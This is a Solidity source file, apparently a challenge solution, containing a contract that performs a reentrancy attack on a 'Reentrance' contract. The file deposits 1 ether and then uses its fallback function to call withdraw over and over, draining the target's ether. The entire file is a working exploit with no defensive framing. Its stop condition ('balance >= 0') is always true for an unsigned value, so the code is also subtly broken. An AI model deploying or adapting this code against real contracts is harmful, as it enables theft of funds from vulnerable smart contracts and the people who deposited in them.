// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

import "./vict.sol";

contract Reenter {
    Reentrance reentranceContract;
    uint public amount = 1 ether; //withdrawal amount

    constructor(address payable reentranceContactAddress) public payable {
        reentranceContract = Reentrance(reentranceContactAddress);
    }

    function initiateAttack() public {
        reentranceContract.donate{value: amount, gas: 40000000}(address(this)); //need to increase the balances account in order to pass the first if statement of the withdraw function
        reentranceContract.withdraw(amount);
    }

    fallback() external payable {
        if (address(reentranceContract).balance >= 0) {
            reentranceContract.withdraw(amount);
        }
    }
}
